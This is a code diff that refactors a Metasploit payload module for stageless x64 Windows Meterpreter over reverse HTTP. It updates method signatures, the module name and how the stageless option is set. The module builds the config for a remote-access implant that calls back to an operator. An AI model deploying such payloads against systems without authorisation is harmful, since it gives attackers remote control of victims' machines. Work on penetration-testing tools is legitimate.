@@ -1,9 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/payload/transport_config'
 require 'msf/core/handler/reverse_http'
 require 'msf/core/payload/windows/x64/meterpreter_loader'
@@ -11,9 +10,9 @@ require 'msf/base/sessions/meterpreter_x64_win'
 require 'msf/base/sessions/meterpreter_options'
 require 'rex/payloads/meterpreter/config'
 
-module Metasploit4
+module MetasploitModule
 
-  CachedSize = 1189955
+  CachedSize = 207449
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
@@ -37,16 +36,16 @@ module Metasploit4
     register_options([
       OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),
       OptString.new('EXTINIT',    [false, 'Initialization strings for extensions'])
-    ], self.class)
+    ])
   end
 
-  def generate
-    stage_meterpreter(true) + generate_config
+  def generate(opts={})
+    opts[:stageless] = true
+    stage_meterpreter(opts) + generate_config(opts)
   end
 
   def generate_config(opts={})
     opts[:uuid] ||= generate_payload_uuid
-    opts[:stageless] = true
 
     # create the configuration block
     config_opts = {
@@ -56,7 +55,8 @@ module Metasploit4
       uuid:       opts[:uuid],
       transports: [transport_config_reverse_http(opts)],
       extensions: (datastore['EXTENSIONS'] || '').split(','),
-      ext_init:   (datastore['EXTINIT'] || '')
+      ext_init:   (datastore['EXTINIT'] || ''),
+      stageless:  true
     }
 
     # create the configuration instance based off the parameters
@@ -65,5 +65,4 @@ module Metasploit4
     # return the binary version of it
     config.to_b
   end
-
 end
